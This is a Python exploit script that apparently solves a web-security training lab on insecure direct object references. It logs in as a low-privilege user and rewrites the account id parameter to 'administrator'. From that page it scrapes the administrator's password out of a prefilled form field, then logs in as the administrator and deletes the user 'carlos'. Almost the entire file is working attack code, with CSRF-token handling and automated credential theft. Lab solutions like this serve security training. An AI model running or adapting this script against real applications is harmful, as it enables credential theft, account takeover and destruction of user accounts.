# User ID controlled by request parameter with password disclosure

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

from bs4 import BeautifulSoup


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def get_admin_password(s, url):
	login_path = url + '/login'
	print('\n[+] Trying to grab CSRF Token to log in..')
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	data_login = {'username': 'wiener', 'password': 'peter', 'csrf': csrf_token}
	print('[+] Trying to connect to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	res = r.text
	if 'Your username is: wiener' in res:
		account_path = url + '/my-account?id='
		print('[+] Logged in as Wiener !\n')
		admin_account_path = account_path + 'administrator'
		print('[+] Trying to steal Administrator password...')
		r = s.get(admin_account_path, allow_redirects=False)	# DO NOT follows 302 redirect
		time.sleep(1)
		soup = BeautifulSoup(r.content, 'html.parser')
		password_input = soup.find("input", {'name':'password'})
		if password_input != None:
			admin_pass = password_input['value']
			print('[+] Found Administrator password: %s' % admin_pass)
			print("                                  %s" % ('-' * len(admin_pass)))
			return admin_pass
		else:
			print("[-] Exploit failed to find Administrator's credentials <!>")
			sys.exit(1)
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)


def delete_carlos(s, url, password):
	s.cookies.clear()
	login_path = url + '/login'
	print('\n[+] Trying to grab CSRF Token to log in..')
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	time.sleep(1)
	print('[+] Trying to connect as Administrator...')
	data_admin_login = {'username': 'administrator', 'password': password, 'csrf': csrf_token}
	r = s.post(login_path, data=data_admin_login)
	time.sleep(1)
	if 'Your username is: administrator' in r.text:
		print('[+] Logged in as Administrator !\n')
		admin_panel_path = url + '/admin'
		delete_carlos_path = admin_panel_path + '/delete?username=carlos'
		print('[+] Trying to delete Carlos user...')
		r = s.get(delete_carlos_path)
		time.sleep(1)
		if 'User deleted successfully!' in r.text:
			print('[+] Successfully removed Carlos user !')
		else:
			print('[-] Exploit failed to remove Carlos user <!>')
			sys.exit(1)


def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)


##########################################################
#	MAIN
##########################################################


def main():
	print('[+] Lab: User ID controlled by request parameter with password disclosure')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Unprotected Path to delete Carlos user...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			password = get_admin_password(s, url)
			r = delete_carlos(s, url, password)

			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')

	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()

